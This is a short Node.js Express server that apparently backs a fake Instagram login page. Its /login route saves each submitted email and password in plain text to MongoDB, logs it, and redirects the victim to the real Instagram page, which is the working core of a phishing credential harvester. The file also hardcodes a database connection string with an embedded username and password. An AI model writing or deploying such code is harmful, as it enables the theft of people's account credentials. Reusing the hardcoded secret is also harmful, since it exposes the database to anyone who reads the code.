const express = require("express");
const mongoose = require("mongoose");
const Blog = require("./User/user");

const app = express();

const dbURI =
"mongodb+srv://Anonymous-Snapdragon:5r9VQavn6sUC7DiM@node-app.k583j.mongodb.net/Node-app"


const port = process.env.PORT || 5000;

mongoose.connect(dbURI, {useNewUrlParser: true, useUnifiedTopology: true})
  .then((result) => {app.listen(port, () => {
  console.log(`App is listening on port ${port}...`)
})})
  .catch((err) => console.log(err))


 app.use(express.static('public'))
 app.use(express.json());
 app.use(express.urlencoded({extended: true}));

 
 app.get('/', (req, res) => {
   res.sendFile('./dist/index.html', {root:__dirname});
 });
 
 app.post('/login', (req, res)=> {
   let {email, passw} = req.body
   
   const blog = new Blog({
     email: email,
     password: passw
     });
   blog.save().
   then((result) => {
     console.log(result)
    res.status(200).redirect('https://www.instagram.com/instagram')
   })
   .catch((err) => console.log(err))
 })
 

